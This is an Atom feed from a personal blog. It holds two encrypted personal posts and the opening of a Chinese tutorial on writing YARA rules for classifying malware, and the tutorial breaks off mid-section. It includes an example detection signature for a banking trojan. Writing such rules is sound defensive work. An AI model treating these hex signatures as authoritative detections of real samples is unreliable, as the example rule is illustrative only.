<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>郁涛丶&#39;s Blog</title>
  
  
  <link href="https://ghostasky.github.io/atom.xml" rel="self"/>
  
  <link href="https://ghostasky.github.io/"/>
  <updated>2022-07-12T06:29:07.402Z</updated>
  <id>https://ghostasky.github.io/</id>
  
  <author>
    <name>郁涛丶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>胡言乱语&amp;自言自语</title>
    <link href="https://ghostasky.github.io/2099/12/31/TOP/"/>
    <id>https://ghostasky.github.io/2099/12/31/TOP/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2022-07-12T06:29:07.402Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="0cb7cbdb648345a33a9e6979455e0210ecdf9085058b05d68fd3ad2624422b05">994f9c06d970fb4aead1c76eb2a7916edca777817bab25f58884ffe78bad7be76b6f3d8ae9fbfbc9491740decbcd07afba5e516f8510367392d6dbc0302be6f6645e8c97e5cbd15538c348b3251446f32e71b0591309cab9217cdec48823960d37bbf315671c8f5c1097d2553871625ed3e5c6ffd959b515a3aa2e8a36b9c916736f06192e65eae90bf97523d4692bf4909a652b01310a2793fdc7ef89fd63021c202d18b297815dc3d5f11205e22a303e957c253c08afa19bf91e6e25f326ec4c5f2fe1e6a967d700681b95797b983d6397b962c10ac677b3d10f2bb1286e3a72708ab20a02c086363129d768363606eae107682bc30aa36a21d021907cb44692a12785a6abeab676cd8fdf0cf88b3c15d3c5961a74c573efd37dc2a4a5942ff5e941b584de12b2f564191aa51920591e86052a5f5dc1a72847f7842bf843549fbf132563798f7b11656c4722ecacbdb70d90be9f1cfe07b0ef5819ce264e3cebe88dd64fd5ec8ab186d75566980619180af2f9ef918a9d58fa8d0efa3eceb8d631cea07c64276b46cea96f80e6a17217fdd386c8d614246a32b7ce5fc0e8e6daa6161dab29f9beeadda0cb353b477f5b819925fac922994f0ebcd21914406be9988383e683b1857d68b9673c9a33aa2b4395db20032fd823f2b4ccd911e1be33d44c136dfa78633f90a1a0b5b90a8ebcbd388c6b60fef2d10f3641b77290136c4c6cec306f46c753e37ef42e135f93a49ab43ceaf4b2cc80c21c1b2ae7aee50bbd87c715cca0d57d88a7fb0419799faaeb88196e930df437eb1d553d40a3c550a8969eae76a3fb26443e163056ba4077f1cf49701540b4f7641f114bef4c8644a04c3350eedce47afbeaedaf3bde7b9738549de34651c099fdb8bceffc80bf95076a4c8538025eb4cbe41ed75b4dccda152e16711dcf5b4246d75d828fdceafb02b0c1c81379bbe93be47009b4d34fc5951093538fdca397c93e3a08b32ef14e5a9113015fcbd945cbc3285b5b86f59948bee19cb595569f6ad5276053eff6661b0ba5197910c85dd42ba68b7978b7e7a1a459cb3507447496f8e4733f413a227cc949413b7eb3efa470206559bf92cb03e81880d12557a5f101362fe3270376104f0990f611d4fc29febac8c622d7c6b2d88f6f481478a315182e8303906ad5d74ab347f59a2b9fe8b45780609719a3c3fb598ddfbc8b9dfc5ebe28c8161030d87d78dd652252120801df46ae4292611162f6a5bc8f20578716e49471d5f3b9bed19e825b0ebc6c91de6551054c06027dedcb11aecc3801af049aea5263c6f56ce6bb5f926e06fc734bef1c79c06321fa8eebc4cce3fb2e1cf727f0c045b1164f8d31105cdfdea763a6bbafd4955592d41a1fd53f1878bce1a375499014bb5b97f995814877793fb35045eb2e6970ece865e04fb98c2398bb98dc4a51e2da6044c77a564c6fc2217e69f3f35eddb61522877aaeeddae5a78c0455a2ad80af212ef24873e9fbacb23c04d78f1595247cc011b43d11d4a1f62e366081197cbe0271d4ac44ea224a37e4d957baefac7909858f5c239dcd8c968521a4fd6b0d35a946182e5efee0e665da56fe5db955b8d341ee8aeb0e2ea4859e572483363a3027b5a3c2e5e129af85a814e1371b1503b80bb84d6aaa9acb2b6219d85edea4f35a26c9938ecb00c13647ff542bb5ee27bffc208fbae704989b13a486e2194516f90aed88829239d6e08beeb685267f43366216db0d721c79053e5082fecdf84b0ab8daa6cd96ea5c954a02ca0b57a4254a3f893bb804c04cedd5f7b275e63f96f7bc112d85a4de992713ce76b8bc41511c7e1d8542564479b1f8947470256ea64175face45a71923823777a4cf642fd116b76c727e755fa4e4aed6c05f4d105b9b6ae42877d9a3df6d112853a62c7cda95911219c8593e5fd1077d7d08fe4b2c8a7e19370127f7165509c2bc7d5a747ecea3d93c4aeea1d35226193a76cda87c577a43a489ba7ecf93cc8a654e6a9c2497a3a0bb4f58a4bf2382a53b4afcf0b386f145fea91dc462d8927d3e285c7b3b60718bde0ed4dbe450b7dc86282c94f19ee483d75b0e06b49833a8bd6a0eaaf953ffb8013c62be4f9af9b9795a6103d3d154a959e385fa11b469da86b1e6412c9da551680f5b0230bbdb96e5903828b5226f31721016d73b28ac1a879703dd1cbfc098895a84b53e88d14c373b5ecffe3bfd85971f95f9ce2860b118dab3586ceb973b35a38acc9759523327947fc94868018739001fbf557aa8e17842f07c6d4a8ea13c9c18f3f3510effd5a9a5f488a7e78b32c20a648566cb769ed9e00122da27234289aba0e7352a8629f3c1c5cdf79a4bc823bc3ac1ceb088b0e5f9eac4011aaa61a6b6dbbf31aaf60822189bb05d4b0fb59c0a497f4362b9699df2de1205ca2b86596b623d5c31fcb6c5f10fd3b15d50d19d3bba26fb04c711dc5b3ff9db5c5bbb5b1e0c6bf3572db74cf76c92c5f85982d7ac689c681b0e2d1c0c7aad02bdac0182ed79d84ba70eac6440ec3a8113250a3f4f31e018582d7241c448b1e4bea903c79a8ca057ed38f79f02b5205582af521f8e10390472c13b0b6526512dfa22825f417757b442d278b1f9bcec7f9c5ac522ae4d18bc63b47978de25b2a82cbbfd2224bbba11577dd0ba4225431ab33aa4fba081d28ac606ea24fabed23b41ef8310f9fcbb99feb7b8ec9148a0144e35cfae31895ceef2adf1518cfcb937cff3f7932d5c8dce46f003da2ac843ad8c9b75beee9f785929627c08e1adbb6f9a827295b9bbe7fe3690376a087d713f6d4be1b3d39db1b7b302691a0f667dfef84efd363f07bc7ca709369a73ef9eb8d44c7f9bcaeef712337afff16921fa34a556ae940d27f0b898414f2e2a18680f03f7f0993aa8ad85eb2cfcb6b59ec7368d733ae6add9a47383439a27a81e41c81f710922af6ab4fddef12745ed86399daac6dbf460e131bd9d79d4e9099731c8985da803137ee617baa139193d2998cd09252f0f827888abc6208d79a8b70236460bd0e59894bd250be70c6e19dc1a7fbc17df76310026d51023da2a45f1bfbd8241e4d70343b9d8b90ebf37ad9b23d8f013acf8fb6322cb7db7e53b91f5a1b3e95e116d8ee653a275a558314960f54917fd8bdb2be8f23676d9401e7d7e94f5edbcbd1a4a14999c8a0390ecb5169773cd4af49419f0b81513021b546d4c8a7d262a8a39119769d1e8060f6d2da232d8a02804c5a377afaf45748565fd279b6054e4c9ed4e167d240d2d37f649ca7e2c37fde1782f22a592a86a7579808caea2b66b825c0f2009cb600867d9c2e000dbd3d8b048a31889a8be547d473432ef0466932946da0668fbb599049f86fd8f11f089d42d2e6f8bb2cd1c2c1cef4e0b5984cc1cde64e2bb591738df034e71e4ccef6c58007d567d3a78a24d853cc01c0619ec9f3860e4e3d062ea7d651438a4498ce07c784a7f9afb9a029d05a21f7a6580d975d70f09508c1a481895d89ae2516a698bce0583b20fce9e2b0b2e45e6f45128b9b627a1a92548f75f0f5e975013ae65b6844fc65223ebca859f2fd36ac1fb160a91a6775c539c1b82e4d1feb43bd15b0be0053a3282f04943904e5dbb1f31654b6f00ab8d326073e0dff4054d2062eb583f62cd8d706e8db61c571fb4f3e59fb8df601480d147b0389ad65e6a0bd3cc22096d80b6d00edd2cdfbbb11a621e2ddfc722c2d029dc0c2d90c7504c29d7e5c16ec73ff7601f2abd725b4833f9ea7a687a8b960ee0d094d981d98a5a15c8e1d224d461399771df388fcbab7f3fb444fd390631d35e3318c862733cad25064a328b2edc54dd99edaa235aa0772febf59fed180057bc2a73c87aa6a16c3e64c82bd1576b0db60a6d4708f0468023b3bdfe7271edb022892510863325a469b91920b37a0710dc4f576d7cc0be6dda6de7da6cb1e7d9a43b9360c5af96930490e65366985e388285f46bdcbb969b4c5b1107bffbea750dd22ea3981010cb5ab60cc714e1117cdc9ae47aacf6156c6b69492a977fdfe8420f6aaf79762db70036d341bcdb254f365c8f02f3c8bc628f03a8ed35821a3214d423452192b3085f170c26276339154193ea2fe71939ba0fcee409bf0ac7a5619c81c7a0c76484b59703dba5464d186186f8e5fbcd5b1b858883df9af65d2fa951c283c8b9a51829f0379299dc129236f80b86025030e3064dbcbeab0faef92ff3ddbf92bfa9a1a78d55d177586c57d64fa965d2c2567e949bd9f6333fd9276124c9713ddfa3680e1fee14232956036e7ffe6ea63dbc1286d69dacc4cb607f8b7e9331f7768d5b8387ebfe7bce286ce4351bc105b69879309a5289c9ea44fe64e0d5c2f58919961724e416470d80a058ef9d3bfc5419e1928257f083769db68b8ac654b1626e01a60bd7de2a0e81d3104fa7f49a636e43c1580259fdc0b656cddd56fd7ca6bdda2b8be2df6499c3cdf1e2d1ed685838190308d0e310ca0dfe6f03f51f13b2651319766302616410d27f3551cf47ca0d52253a549c53a030c2733c11e635507e7b57cf41dc64f9de68da4dd072c66feb85dd7b3728dae2f17588be4eb3713e6443566669ddf3a75ea3da8f567d4fc7d92c6f4e243be7c46374b0e3aab3b0b45e19c8db0141ed130f4a03020fde0b7c207fecdaf02996c00e26835322b981fc18934672ea02616db149cbde22131bf8c29e6a57f9fbaf360472f83027402711f3e99ecc1033e847716093bf557111ef5297036e97be748ce40132047782bee3571272e70b3d734d8e5171442bf2ec43db07f103fbea2f6274aed062400570a6cf0708e1d4338c4961009670748fb5ff5944316b8a53cb3c344b3bf5adf5f254e7171b58c242419a6176a96d2e69200ba08b549bf4153302496809d415996a3b8bb9ed1f6731b4ae9cfd469ae156f31a8f0a90228faf8581a44097e39df200e2ca98e2e0612183faa661497992ce91b3d0e62e0a3123f46e18371d2b6b61b3aefb988bf9f299850604184900253302643450b246a9a74b6de86b5d61b7903fecb89145ec6e8522baa0b3825a93d5182516f44f0c440e4ffd2135047ec6810fefa449d6de15e186327b8b7f4d11239417105740e599bef460ad9e8509a87990752249b77e169a64920bf5fbd7b8d36580674ee5510ffe2de2ce05c5f094dfe9cbc622364d015f932fae98d6f00d4bbddbc7b43a1f7c0c3e1581dee2d2f1b31c31bddb32c3039561fcc462b310bd6a0796c2db80d74f993ae6ded14dc8247252cd055730929c3876bdbb5f578a51d18030490be0ea85548cde4453eb8a80d8330584ec3b76807af8b4c708a5bc7865b5c0ccfff0e873b9fb2bd5670ce47fad3a1495332395ad487c1436189389473b82432f1b40bdc77008c0216f0930f6b7840dbc9393a02ed48f68c6575677308799e7176d810380f406574c604de8d397c7cca874c8b8a79f02bb1f8406d2902a0f27c027f469729448de1c3a34b8e1d1bd6a67dde0a2609c5017ef67067c2038811da573317b0aeea5cc07bab613ab84174a0cc435cef2db889549d2ed05fc8ac87f6d1ac2dc9c820a048bd4ee93a929ffe1921a785d391edbf2de5f10ab314bd3196b7dced4923afbd9a0c3cb63150163140efcd56fecc72a7de8db000a5f63e89f57592d263ea70c792747516cd34703589bd5b873c8cb7d7dd5ffd16f4a23dbf5419870a555b34220a8a42a2d3912b292216109a44c2af9fbecdcf66ea1628a6bfa208ecacf183ac45fec431aa0860ac068a53ca3a75e2ecdf93730ce7bad0c9bee7757c44e83357cdcc957ab9712b251526dbe84a0b50ebe82c9f99539565ef97bb9951ca6c67de6f83cff5bd2b20c342269494881264d525a21e557c0fec974e03c8b20ceda7962ca065d9db56134f3be88161a86967aec2139a5b235b2edd9aa5b629466e597d6886caf85e7340e9f27759c91a346d3b9034bc347f6de6ff3df3ddeeb3d2ddf47082808ca1dec4d541a34075d5549cc33883337ffd31bed4c75c3e2b6d7e915dbedec30c56e758e0d48f0465d2b909fc7fdcc7f4d7f8a01daf68cbc74551d6c1da59cac4dd31756993cfe77515fa18815615104c145826d28b2fc05d2d1c3b284b5a55727455ab237a01b0ccf3c5afc583d2994819368f2c591eb8c87fbd02fd98fa3b0a9fad251ad079223df995b9d0aeaafd3a60a0d966f1437bcc78d4748962de8dc42e090930f85c8ad05e514df1f4205a3a921526fab9b59c4c3c00fc8ef92bde5412a19a3fa2b5f8240507e78d1d497c0b60b8c98f79b9cfe9cffa8ced14718fc1f71b059316772527b95a4eacf9d006f93367000144418758fd5c582f60b53d945289ebfd227ce9116f658f3076feefee53a9bd5e743fb598bcc7e75bb05eabbe593ccee68c440b02f432ea4fe2f0802fe6f2d029c100ece7d4211a7da7455dcbba5bb73dd53b726818a0b5c1d9548130cbfb44542a21bfb3c84b3e1bc77844cf325ede599becf4c38dc42563a0776e0c58049287ad40c909b8041a54cfc0f48d8ca707351eb78eb438ae25b220e1616949e60a88dd3055517e31a7b30b80740c4ae95b3737eda8cbc5b7257ff3be8f535ac48e7e262ddbf2d98dc6c27fa3469830272c851f19f611b07707de8cf4e33351f6e37a74ee3a799635c53c927358f646851e455271fa43380eb866f45278574336992b093a8b1e5a6a7df6c279fd89a94b0adaebdc3598724f5f026be9d2a21a0b856400d3307b758c8dd7c6ab28036f13492a97486ed98c56894dd114118e6bf3dd65503123a2651ef394d45b408a1c864085bb3e835a1fae1a0f1b538772dde3625abc23707916ebe22c8e6c7f4e5bd170f56e03dafe2e7bda0f7fae9c04f5175a08675153824ae04388362c846fb2cc23cc42b520bf565eebab644c576089e04cfdac9f54e6b1ad5dfd869775e2d58f316f3e65be79be6e3ad381de5b6fa680af604263328dab35e0b46f4216fca4929c119ebb9e15883c21619cb5a502ba35dfc3a8a80e690bb41506372ed067842194ad84942d2083049c71c18e6494f43ae659d9993ea2dd43b10c1f8302912b3fef9699eaff1b1bd8902f65220fe5b7634fcbcbdf7f22c19248dd452fb3056ca2423866b21ebc88e85cbc4bce9d4b831c03afa113dbfadedff53e323c86dcb7c3105c83843f793a409682949848af46b25a2f34308fa62bfed8470acc799252168c5a51ce25ee7a7f3489b595e73d4bac91aac5eea86efcd11ab32739680a0242110a738dd825366bc28df2aa0436d994a02532b6744ca4f3b5e0d3bce43a575968714fda20be7d309a85013d1db30b7c0ec9b0e993e8c663ae23a55acf1243b34789bc359e9b83acf01b98b95cfe1802489a5417406967248aa2aef0a1404b1f4d2b68ee763bb43d6a137eabce9bec568702cecced9c3fb8a6a115275b2f5fae8ae6ebe10b679465aca4d2ddb0863e34b85665884a224937f9884d93c47b7651bca0435c4b265e58472a4ea26b373862bfc27ff3634f24a24c9a52fe93cbf100e9fe9917d354a651ae8aca94c4f0174bed32857b6d55694d097b8122394b0ef4aca999bda33d5bffdac5e1dd3f1f43773c1f76b0136c76a6bca4615170eaaf39fe59390aa78ee85eeed8fea0564ff10289390d92c6ed75596539731d04f9f16aa7c1fc40a3b2ee924d23fa3ebdff45d3f410e16461b776e66cac1eab00d54a980fbce3c1e19f19e0e285cbcfb066e7db6d772218dce8265b5f48d3fc5703888e3f001766c93c7669d528271fb51713f62969dd1f4dc0ccb15b640aa01cac399ea463a6a108ff712e2e798ef98b5d230895094a02666617b8b1e30af83a6b66b87eb887ec50562cf82266ab8230cda56acc42987ac49aa8c8b5a518f83e452d5cd56f596bebd5a6f1170ec8ed72cd343974758e68513e378d6a52ccc89f44ac14bdb6287ce2d0a83a387c9798b4f8008f309ca451493c9e31f78f7a435b264292494131a282ab9ad870da4de13e6be9c160ec911d6fc2c1e3e84e50b33f9493d493897c150b607008af579927c48a94e7a193212c9a4c83695e36cb8ac67f8b328f7d7a27472e203ec73f79b1e1c028c6bb2976ffff7a7186e5934e5911f07a02832a24cc2d5227c435b31ec4f5f71cdfe8ca60a86c95edd5a6bec510cdfdd872efe4cfae24506b1f91f376341d63f7e222968582f499a42de11f549f8211dd8298092d240c743c7243e6e5fd3669f6e3d7773eb98976810d9462a1423a629bebf7c6583940fb30ded4860e6aade99e1345440f1621de4862df8fcb1dc0bfb1f299cbef37c9a8a8f5115203189d01c8af919f904964f5fdfd1afa913aa5b6f8c101084a4cdebe62233f6eb750447e3f842df9951b690ba8a6b9761728429045989f5b0f02663599dcc57955cd28984f6e947671964fa79427dbac3a7265767963d41b74b5c4398b20eadaa46de31f42d2e2dfe1f15341a6f26decedf660020a39dd25b4d44eca089ac1ca1076cbc32551d3c18d6d68d39da75ad1c7f7dece64c71cdfc69b9dbe3d3889a63dc63d2c316d552fb82899ce4e5a28f67419fde33a4a400ae70f19eed87eada98cee68261e33c6fb40d1ff0510166694165c76e4e349cf86dc8cb19f46e31029720a6e8997bd18eabf25229eb5ac07f1d82268dc0cee1c96a825b2a4de986389417274c1a9ba6e6701c3306304473bdcd2d1931bdd9eaba7c4e6be333cd27f5a6678abec698d443539ae5dd2a2e1eb4bb053fecab045ce95af1fd6ca83392ba3c8e10b97c64d268680ffe9ef29db2c19553bde60223ab94b20b2452a435815709be81598fd2968e2aa97882967d50e199cee3be244cb1bd9567e4bb20a90917a33b865960c4d76b5ed363cbf5dfbffcc82c801299521782dac4cd0cd0f2badad03990a1c5b45c0c02fb08860786b773a7fe015f72b18dce1cb63e27583d4737202b0dbe67c60a13d1e64039215cabffa8ceb96ee0976271ed7e6b9d8bbd6841d607ad74506bebe15c043cb02999340b2ec9c5804152f93cbaccd7c92feb9f0ff0ea35763dad2e7c4394140a2a41283794f84a0701ca429788e9c2df60b1b75ce65274b1b0441f79d441557f0f3207b02e0122464988d584c82f5ee7487e4ce73108534fbd37e9a9d3e84f15c5d48536d052a2c2229c6f9d47b7408508bb8cd0f4a1534571bf3e0f2dfe735e5fd9093005c2a233e3250c3644c194a29585db3b1719aec2abd9e87bcf71f5a74c06e8e849bd835f6b31988eca71b5a198c0e99d81df34edc2d51f419ff278b10fa52c0e11b4dd4be0f4c0c73fc7ca329624b35e11f03f786bd3fa8174c000031d66ea7be9133dcdebbff25d60fde034656221126ae990a7fe1a5f6c62fa8ef1c94e602bc5db50f47674b6838dbaaa2ce0e5e3d3b12950e7b112c1c378842f019e6df38a4696fee17553fe7c143012ccadad4eab228d94abb05897e4580d44f5bf313c77e153369aeb1fc564bc6b0e4b4a19bbd4b1ba439470e5026944fb2cf289aa8313ef78288eff79702a61d7aa7b050a5552dd59d2d22407ae523d653ea69684bd78ee49529266e396ce6433041781275893fe5c4339e3f1db47f2948fff4c36943042989597c3cc51afc7af23561ba923ed3606ade20040e86d625e04f61b3eaa9469f8b1b797cda145461a507fc9d9d32872bf85a3199b092a4e98777dccd0f571b4215a23104b6359895edf19ec39c46557e137e7640cad13494cfc7bc831a43f49a515f1faeef34c3c83e5f044217e91a6b622ccc776a2f76fc508d2e8271b264c13b2c1e85400a330df055e88a3e7e662a1b1b426c21a44ccb1c5037dfd86023c48ec6ee891fbc5c332427b78f435c62d8efbe2728a3408c28098c85d002f7d3e3930911946e5b4c6d20af8a80880a38d9c36a503998bd89bdc12d34e38f4db6c61b09b6215772e5e267005b6e1fff0fa86c79731aa619ba1ca5deddfffe42f6f72d80d20c96607b1f1f1deba308fb561b00aea2a69af1be5cf0c0a570d3b738a5262d032f7cc5416023102e5b6a19e982a8c2233fe59df59830c48701a08dc6b4db59755385b7e50f48fccb065edffb1ee43e7721c379565368bcae5c82c84f633f4889804433af9dcb19d8c8efd54aa539916bde34b52db1b11cb21e7acb3cd43e1186e0bef129651083f082c9213efeb57a82b401188aa2f231db6ac77ed92bd4fe8029a1afeb91c75ced3c98993ba9d4a1d186142c01eb8af3132389874b214a47313c1309987d622ab6d3b89a98851d5f0ff48c56a7826efa29f381a9d4a605dbbb0be10035bbb8f8bfdf147886b4c30bb9ceac1c0511b4631303a3838a8c482e9d838338dfc18469c4bf9090cf3aba3284d1b50fe71efeee0c40a6f881b7532df891a3fd9dedb0c3842809f313895ed354522e13379113b82a1458eec61eef3465fe24dc88a4ce062bfb244c4ac58f1051c3bfb785fd1b34858c6a44b2ac4cda4e221b08e9cd2537eb7bb8bb7daf85bc20ff545a8defab53ccd3295b72101a0bcbce00bd0e7207ac703e1191fe1ccec53c8989f1d594cc1d3ebdbc50ced2d9300b7369d1af1e4b0a50d255a97e49dc97767fb301a8efe8668503712845421c44abbad82dcb5669f0898476514bacc42c751c14f6aabec172896e26c950de390f274ccf4afb7f25f03b5baee4771188b5119315b738f131fd0d9048354ff58585ab7e420bd5cb5ac969c8bbfb6534044e2358a0ffb2a9505</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
  </entry>
  
  <entry>
    <title>日常碎碎念</title>
    <link href="https://ghostasky.github.io/2099/12/31/TOP%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>https://ghostasky.github.io/2099/12/31/TOP%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2022-07-21T05:44:25.464Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="9c14c29a873c19aee424e783624f7be73ef4ab392f1d84ca271ae9627fb1241a">994f9c06d970fb4aead1c76eb2a7916e14b9466af8aee544a618a637115cb50a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
  </entry>
  
  <entry>
    <title>YARA规则学习</title>
    <link href="https://ghostasky.github.io/2022/08/13/2022-8-13-Yara/"/>
    <id>https://ghostasky.github.io/2022/08/13/2022-8-13-Yara/</id>
    <published>2022-08-12T16:00:00.000Z</published>
    <updated>2022-08-13T14:37:52.752Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="yara简介">1.YARA简介</h1><p>YARA 是一个旨在（但不限于）帮助恶意软件研究人员识别和分类恶意软件样本的开源工具。</p><p>YARA的每一条描述、规则都由一系列字符串和一个布尔型表达式构成，并阐述其逻辑。YARA规则可以与文件或在运行的进程，以帮助研究人员识别其是否属于某个已进行规则描述的恶意软件等。</p><blockquote><p>项目地址：https://github.com/VirusTotal/yara，（yara64.exe ， yarac64.exe ）</p><p>python：https://github.com/VirusTotal/yara-python</p><p>官方文档：https://yara.readthedocs.io/</p></blockquote><h1 id="yara示例">2.YARA示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = <span class="string">&quot;This is just an example&quot;</span></span><br><span class="line">        thread_level = <span class="number">3</span></span><br><span class="line">        in_the_wild = <span class="literal">true</span></span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123;<span class="number">6</span>A <span class="number">40</span> <span class="number">68</span> <span class="number">00</span> <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">6</span>A <span class="number">14</span> <span class="number">8</span>D <span class="number">91</span>&#125;</span><br><span class="line">        $b = &#123;<span class="number">8</span>D <span class="number">4</span>D B0 <span class="number">2B</span> C1 <span class="number">83</span> C0 <span class="number">27</span> <span class="number">99</span> <span class="number">6</span>A <span class="number">4</span>E <span class="number">59</span> F7 F9&#125;</span><br><span class="line">        $c = <span class="string">&quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        $a <span class="keyword">or</span> $b <span class="keyword">or</span> $c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上规则：</p><ol type="1"><li>名为<code>rule silent_banker</code>的规则，其中<code>banker</code>是规则的tag字段(可以有多个tag)</li><li><code>meta</code>字段是规则的描述信息，比如可以有规则说明、作者信息、威胁等级、在野情况、文件MD5、来源等内容；</li><li><code>strings</code>是规则字段</li><li><code>condition</code>则是条件判断的字段</li></ol><h1 id="yara规则">3.yara规则</h1><blockquote><p>官方文档：https://yara.readthedocs.io/en/v4.2.3/writingrules.html</p></blockquote><p>yara中的规则都以<code>rule</code>开头，后面跟着的是<code>identifier</code>（标识符），标识符和编程中的变量命名差不多，部分保留的关键字不能用作标识符：</p><table><thead><tr class="header"><th style="text-align: center;"><strong>all</strong></th><th style="text-align: center;"><strong>and</strong></th><th style="text-align: center;"><strong>any</strong></th><th style="text-align: center;"><strong>ascii</strong></th><th style="text-align: center;"><strong>at</strong></th><th style="text-align: center;"><strong>base64</strong></th><th style="text-align: center;"><strong>base64wide</strong></th><th style="text-align: center;"><strong>condition</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>contains</strong></td><td style="text-align: center;"><strong>endswith</strong></td><td style="text-align: center;"><strong>entrypoint</strong></td><td style="text-align: center;"><strong>false</strong></td><td style="text-align: center;"><strong>filesize</strong></td><td style="text-align: center;"><strong>for</strong></td><td style="text-align: center;"><strong>fullword</strong></td><td style="text-align: center;"><strong>global</strong></td></tr><tr class="even"><td style="text-align: center;"><strong>import</strong></td><td style="text-align: center;"><strong>icontains</strong></td><td style="text-align: center;"><strong>iendswith</strong></td><td style="text-align: center;"><strong>iequals</strong></td><td style="text-align: center;"><strong>in</strong></td><td style="text-align: center;"><strong>include</strong></td><td style="text-align: center;"><strong>int16</strong></td><td style="text-align: center;"><strong>int16be</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong>int32</strong></td><td style="text-align: center;"><strong>int32be</strong></td><td style="text-align: center;"><strong>int8</strong></td><td style="text-align: center;"><strong>int8be</strong></td><td style="text-align: center;"><strong>istartswith</strong></td><td style="text-align: center;"><strong>matches</strong></td><td style="text-align: center;"><strong>meta</strong></td><td style="text-align: center;"><strong>nocase</strong></td></tr><tr class="even"><td style="text-align: center;"><strong>none</strong></td><td style="text-align: center;"><strong>not</strong></td><td style="text-align: center;"><strong>of</strong></td><td style="text-align: center;"><strong>or</strong></td><td style="text-align: center;"><strong>private</strong></td><td style="text-align: center;"><strong>rule</strong></td><td style="text-align: center;"><strong>startswith</strong></td><td style="text-align: center;"><strong>strings</strong></td></tr><tr class="odd"><td style="text-align: center;"><strong>them</strong></td><td style="text-align: center;"><strong>true</strong></td><td style="text-align: center;"><strong>uint16</strong></td><td style="text-align: center;"><strong>uint16be</strong></td><td style="text-align: center;"><strong>uint32</strong></td><td style="text-align: center;"><strong>uint32be</strong></td><td style="text-align: center;"><strong>uint8</strong></td><td style="text-align: center;"><strong>uint8be</strong></td></tr><tr class="even"><td style="text-align: center;"><strong>wide</strong></td><td style="text-align: center;"><strong>xor</strong></td><td style="text-align: center;"><strong>defined</strong></td><td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;"></td></tr></tbody></table><p>strings的部分由<code>$</code>后跟一系列字母数字字符和下划线组成，strings可以以文本或十六进制形式定义，示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule ExampleRule</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $my_text_string = <span class="string">&quot;text here&quot;</span></span><br><span class="line">        $my_hex_string = &#123; E2 <span class="number">34</span> A1 C8 <span class="number">23</span> FB &#125;</span><br><span class="line">    condition:</span><br><span class="line">        $my_text_string <span class="keyword">or</span> $my_hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol type="1"><li>文本使用引号括起来</li><li>十六进制使用大括号（只能是16进制</li></ol><h2 id="注释">3.1 注释</h2><p>跟c语言一样，行注释和段注释都一样。</p><h2 id="strings">3.2 Strings</h2><h3 id="hex">3.2.1 